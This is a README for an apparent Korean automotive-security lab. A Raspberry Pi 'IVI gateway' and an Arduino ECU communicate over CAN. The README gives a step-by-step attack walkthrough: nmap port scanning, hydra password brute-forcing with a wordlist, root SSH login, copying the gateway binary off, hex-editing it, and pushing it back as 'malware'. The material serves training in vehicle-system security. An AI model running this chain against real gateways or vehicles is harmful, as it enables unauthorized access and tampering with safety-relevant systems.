# SmartCar
## Project goal
Implementation of Smart-Car CAN protocol & Utility data for IVI(In-Vehicle Infotainment) gateway attack using vulnerable port.

## Practice Equipments
- **RPi**: IVI Gateway 역할, 자동차 외부 네트워크의 Gateway
- **Arduino**: ECU 제어 역할, 자동차 내부 시스템의 ECU 제어
- **CAN shield**: RPi ↔ Arduino간 CAN 프로토콜 통신 가능
- **Sensors**: Motor, Text LCD, LCD Monitor
- **Android**: Android 앱, SmartCar 조종 인터페이스 제공
- **SmartCar.pdf**: SmartCar 해킹 실습

## Architecture
![architecture](https://user-images.githubusercontent.com/20378368/105503161-9c1a7300-5d09-11eb-871d-fbd33bc41c54.PNG)

## Let's Hack an IVI-Gateway 👿
![attack](https://user-images.githubusercontent.com/20378368/105503603-24991380-5d0a-11eb-8a7a-1387fc79391d.png)
### Exploit Target Binary
- **Step 1**: IVI Gateway Log 분석  
![step1](https://user-images.githubusercontent.com/20378368/105573332-1c8bb300-5da0-11eb-9b70-fdc469eea789.PNG)
```
- Android App ↔ IVI Gateway 통신 과정에서의 Log 분석
```
- **Step 2**: TCP Port Scanning
```
- Kali Linux 설치
- 설치 방법: https://hack-cracker.tistory.com/78
```
- **Step 3**: Password Cracking
```
- Android App ↔ IVI Gateway 통신 과정에서의 Port 분석
- nmap <IVI Gateway IP> -sS -sV -p <Port Number>
- ping <IVI Gateway IP> -c 5
- gzip -d /usr/share/wordlists/rockyou.txt.gz
- hydra -l <ID> -P <PW Dictionary File Path> -V -f -o <Output Path> <Service://IP:Port>
```
- **Step 4**: root 권한으로 SSH 원격 접속
```
- ssh -l <ID> -p <Port> <IVI Gateway IP>
- Step 3에서 찾아낸 root password로 접속
```
- **Step 5**: IVI Gateway의 네트워크 상태 확인
```
- netstat -tnlp
- file /proc/<PID 번호>/exe
```
- **Step 6**: SSH를 이용한 IVI Gateway 바이너리 취득
```
- scp root@<IVI Gateway IP>:<iviGateway 파일 경로> <Kali Linux에 저장될 경로>
```

### Malware Injection 👿
- **Step 1**: Hex Editor를 이용한 바이너리 수정  
![step2](https://user-images.githubusercontent.com/20378368/105573522-8ce70400-5da1-11eb-9e8d-0f6ef08e5c32.PNG)
```
- 명령어 부분에 의미 없는 값으로 변조 → 해당 기능 동작 X
- 명령어 부분에 다른 명령어 값으로 변조 → 해당 기능 대신 다른 기능 실행됨
```
- **Step 2**: SSH를 이용한 Malware Injection
```
- scp <Kali Linux에 저장된 경로> root@<IVI Gateway IP>:<iviGateway 파일 경로>
```
- **Step 3**: IVI Gateway 다시 시작
```
- ssh root@<IVI Gateway IP>
- init 6
```
